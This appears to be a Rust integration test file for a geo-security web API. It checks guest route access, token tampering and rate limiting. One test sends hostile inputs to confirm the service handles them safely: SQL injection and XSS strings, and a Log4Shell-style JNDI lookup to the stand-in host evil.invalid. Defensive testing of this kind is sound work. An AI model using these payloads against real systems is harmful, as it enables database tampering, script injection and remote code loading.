use actix_web::http::header;
use actix_web::http::StatusCode;
use actix_web::{test, App};
use mkt_ksa_geo_sec::api;
use mkt_ksa_geo_sec::security::jwt::JwtManager;
use mkt_ksa_geo_sec::security::secret::SecureString;
use serde_json::json;
use uuid::Uuid;

mod support;
use support::build_state_with_db;

fn issue_token_for_user(user_id: Uuid) -> String {
    let jwt = JwtManager::new(
        &SecureString::new("integration_test_jwt_secret_key_more_than_32".to_string()),
        3600,
        "mkt_ksa_geo_sec".to_string(),
        "api_clients".to_string(),
    );
    jwt.generate_token(user_id, vec!["guest".to_string()])
        .expect("token generation")
}

fn sample_behavior(entity_id: &str) -> serde_json::Value {
    json!({
        "entity_id": entity_id,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "location": [24.7136, 46.6753],
        "network_info": {
            "ip_address": "8.8.8.8",
            "is_vpn": false,
            "connection_type": "WiFi"
        },
        "device_fingerprint": "dfp-demo"
    })
}

#[actix_web::test]
async fn concurrent_guest_users_cover_core_routes() {
    let (state, _seed_user_id, _seed_token, _other_user_id) = build_state_with_db(500).await;

    let app = test::init_service(App::new().app_data(state.clone()).configure(api::config)).await;

    let guests: Vec<(Uuid, String)> = (0..10)
        .map(|_| {
            let user_id = Uuid::new_v4();
            let token = issue_token_for_user(user_id);
            (user_id, token)
        })
        .collect();

    for _round in 0..3 {
        for (guest_user, token) in &guests {
            let auth = (header::AUTHORIZATION, format!("Bearer {token}"));

            let req_user = test::TestRequest::get()
                .uri(&format!("/api/users/{guest_user}"))
                .insert_header(auth.clone())
                .to_request();
            let resp_user = test::call_service(&app, req_user).await;
            assert_eq!(resp_user.status(), StatusCode::NOT_FOUND);

            let req_behavior = test::TestRequest::post()
                .uri("/api/behavior/analyze")
                .insert_header(auth.clone())
                .set_json(json!({ "input": sample_behavior("guest-entity") }))
                .to_request();
            let resp_behavior = test::call_service(&app, req_behavior).await;
            assert_eq!(resp_behavior.status(), StatusCode::OK);

            let req_device = test::TestRequest::post()
                .uri("/api/device/resolve")
                .insert_header(auth.clone())
                .set_json(json!({
                    "os": "Android",
                    "device_info": "Pixel-8",
                    "environment_data": "mobile-wifi-riyadh"
                }))
                .to_request();
            let resp_device = test::call_service(&app, req_device).await;
            assert_eq!(resp_device.status(), StatusCode::OK);

            let req_network = test::TestRequest::post()
                .uri("/api/network/analyze")
                .insert_header(auth.clone())
                .set_json(json!({"ip": "8.8.8.8", "conn_type": "WiFi"}))
                .to_request();
            let resp_network = test::call_service(&app, req_network).await;
            assert_eq!(resp_network.status(), StatusCode::OK);

            let req_sensors = test::TestRequest::post()
                .uri("/api/sensors/analyze")
                .insert_header(auth.clone())
                .set_json(json!({
                    "reading": {
                        "sensor_type": "Accelerometer",
                        "value": 0.45,
                        "timestamp": chrono::Utc::now().to_rfc3339()
                    },
                    "history": [{
                        "sensor_type": "Accelerometer",
                        "value": 0.41,
                        "timestamp": chrono::Utc::now().to_rfc3339()
                    }]
                }))
                .to_request();
            let resp_sensors = test::call_service(&app, req_sensors).await;
            assert_eq!(resp_sensors.status(), StatusCode::OK);

            let req_alert = test::TestRequest::post()
                .uri("/api/alerts/trigger")
                .insert_header(auth.clone())
                .set_json(json!({
                    "entity_id": guest_user,
                    "entity_type": "guest",
                    "alert_type": "guest_login",
                    "severity": "low",
                    "details": {"source": "concurrent-test"}
                }))
                .to_request();
            let resp_alert = test::call_service(&app, req_alert).await;
            assert_eq!(resp_alert.status(), StatusCode::OK);

            let req_geo = test::TestRequest::post()
                .uri("/api/geo/resolve")
                .insert_header(auth.clone())
                .set_json(json!({
                    "os_info": "android",
                    "device_details": "pixel",
                    "environment_context": "mobile-wifi",
                    "behavior_input": sample_behavior("guest-entity")
                }))
                .to_request();
            let resp_geo = test::call_service(&app, req_geo).await;
            assert!(
                resp_geo.status() == StatusCode::OK
                    || resp_geo.status() == StatusCode::UNPROCESSABLE_ENTITY
            );

            let req_smart_access = test::TestRequest::post()
                .uri("/api/smart_access/verify")
                .insert_header(auth.clone())
                .set_json(json!({
                    "geo_input": null,
                    "behavior_input": sample_behavior("guest-entity"),
                    "os_info": "android",
                    "device_details": "pixel-8",
                    "env_context": "mobile-wifi-riyadh"
                }))
                .to_request();
            let resp_smart_access = test::call_service(&app, req_smart_access).await;
            assert_eq!(resp_smart_access.status(), StatusCode::FORBIDDEN);

            let req_with_invalid_token = test::TestRequest::post()
                .uri("/api/behavior/analyze")
                .insert_header((header::AUTHORIZATION, format!("Bearer {token}.tampered")))
                .set_json(json!({ "input": sample_behavior("guest-entity") }))
                .to_request();
            let resp_invalid = test::call_service(&app, req_with_invalid_token).await;
            assert_eq!(resp_invalid.status(), StatusCode::UNAUTHORIZED);
        }
    }
}

#[actix_web::test]
async fn attack_payloads_are_rejected_or_safely_handled() {
    let (state, user_id, token, _) = build_state_with_db(120).await;

    let app = test::init_service(App::new().app_data(state.clone()).configure(api::config)).await;

    let req_alert_injection = test::TestRequest::post()
        .uri("/api/alerts/trigger")
        .insert_header((header::AUTHORIZATION, format!("Bearer {token}")))
        .set_json(json!({
            "entity_id": user_id,
            "entity_type": "user' OR '1'='1",
            "alert_type": "xss<script>alert(1)</script>",
            "severity": "high",
            "details": {
                "sql": "'; DROP TABLE users; --",
                "template": "${jndi:ldap://evil.invalid/a}",
                "html": "<img src=x onerror=alert(1)>"
            }
        }))
        .to_request();
    let resp_alert = test::call_service(&app, req_alert_injection).await;
    assert_eq!(resp_alert.status(), StatusCode::OK);

    let req_device_threat = test::TestRequest::post()
        .uri("/api/device/resolve")
        .insert_header((header::AUTHORIZATION, format!("Bearer {token}")))
        .set_json(json!({
            "os": "android-rootkit",
            "device_info": "rootkit memory_scrape implant",
            "environment_data": "mobile-wifi"
        }))
        .to_request();
    let resp_device = test::call_service(&app, req_device_threat).await;
    assert_eq!(resp_device.status(), StatusCode::INTERNAL_SERVER_ERROR);

    let req_malformed_json = test::TestRequest::post()
        .uri("/api/network/analyze")
        .insert_header((header::AUTHORIZATION, format!("Bearer {token}")))
        .insert_header((header::CONTENT_TYPE, "application/json"))
        .set_payload("{\"ip\":\"8.8.8.8\",\"conn_type\":\"WiFi\"")
        .to_request();
    let resp_bad_json = test::call_service(&app, req_malformed_json).await;
    assert_eq!(resp_bad_json.status(), StatusCode::BAD_REQUEST);

    let mut limited = 0usize;
    for _ in 0..200 {
        let req = test::TestRequest::get()
            .uri(&format!("/api/users/{user_id}"))
            .insert_header((header::AUTHORIZATION, format!("Bearer {token}")))
            .to_request();
        let resp = test::call_service(&app, req).await;
        if resp.status() == StatusCode::TOO_MANY_REQUESTS {
            limited += 1;
            break;
        }
    }
    assert!(limited > 0, "rate limiter must block request flooding");
}
